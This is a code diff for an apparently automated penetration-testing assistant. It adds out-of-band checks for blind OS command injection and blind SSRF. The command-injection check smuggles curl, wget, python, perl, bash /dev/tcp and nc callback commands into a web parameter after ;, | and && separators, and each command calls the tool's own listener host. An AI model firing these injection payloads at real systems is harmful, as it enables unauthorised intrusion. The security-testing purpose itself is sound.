@@ -17,6 +17,7 @@ from __future__ import annotations
 
 import getpass
 import os
+import random
 import re
 import sys
 import time
@@ -1262,6 +1263,68 @@ class AssistSession:
                                   source=f"active probe · param={param}", param=param,
                                   category="web", confirmed=False))
         self.notes.append(f"[lead] {title} on {target} param '{param}' — {evidence}")
+
+    def _oob(self):
+        """Lazily start Brukal's in-cage out-of-band listener (self-hosted collaborator).
+        None when there's no real cage (fake/test) — blind checks then simply return
+        False."""
+        if getattr(self, "_oob_listener", "unset") != "unset":
+            return self._oob_listener
+        self._oob_listener = None
+        container = getattr(getattr(self.executor, "_kali", None), "container", None)
+        if container:
+            from .oob import OOBListener
+            lis = OOBListener(container)
+            if lis.start():
+                self._oob_listener = lis
+        return self._oob_listener
+
+    def confirm_blind_rce(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Confirm BLIND OS command injection out-of-band: inject a command that calls
+        Brukal's in-cage listener across the common separators; if the listener receives
+        our unique token, the target executed it. Proof with no in-band evidence."""
+        import time
+        lis = self._oob()
+        if lis is None:
+            return False
+        token = "rce" + str(random.randint(10 ** 6, 10 ** 7))
+        cb, ip, port = lis.callback_url(token), lis.ip, lis.port
+        rawget = f"GET /{token} HTTP/1.0\\r\\n\\r"
+        # Try every common exfil method + shell separator — real targets vary widely in
+        # which HTTP client they ship (curl/wget/python/perl/bash-tcp/nc). Sent as DATA
+        # through the WEB path (no local shell); the target's shell runs them.
+        exfils = (f"curl -s {cb}", f"wget -qO- {cb}",
+                  f"python3 -c \"import urllib.request;urllib.request.urlopen('{cb}')\"",
+                  f"perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new(\"{ip}:{port}\");"
+                  f"print $s \"GET /{token} HTTP/1.0\\r\\n\\r\\n\"'",
+                  f"bash -c 'exec 3<>/dev/tcp/{ip}/{port};echo -e \"{rawget}\\n\">&3'",
+                  f"echo -e \"{rawget}\\n\"|nc {ip} {port}")
+        for sep in (";", "|", "&&"):
+            for ex in exfils:
+                self._probe(url, param, f"127.0.0.1{sep}{ex}", method, extra)
+        time.sleep(2)
+        if lis.hit(token):
+            self._record_confirmed(url, "Blind OS command injection (out-of-band)",
+                                   "critical", param,
+                                   f"target called our OOB listener with token {token}")
+            return True
+        return False
+
+    def confirm_blind_ssrf(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
+        """Confirm BLIND SSRF out-of-band: point the parameter at Brukal's in-cage
+        listener; a callback proves the server made the request."""
+        import time
+        lis = self._oob()
+        if lis is None:
+            return False
+        token = "ssrf" + str(random.randint(10 ** 6, 10 ** 7))
+        self._probe(url, param, lis.callback_url(token), method, extra)
+        time.sleep(2)
+        if lis.hit(token):
+            self._record_confirmed(url, "Blind SSRF (out-of-band)", "high", param,
+                                   f"server fetched our OOB listener with token {token}")
+            return True
+        return False
 
     def confirm_surface(self, max_params: int = 12) -> int:
         """Autonomously confirm the web vuln classes (SQLi · cmdi · LFI · SSTI · XSS ·
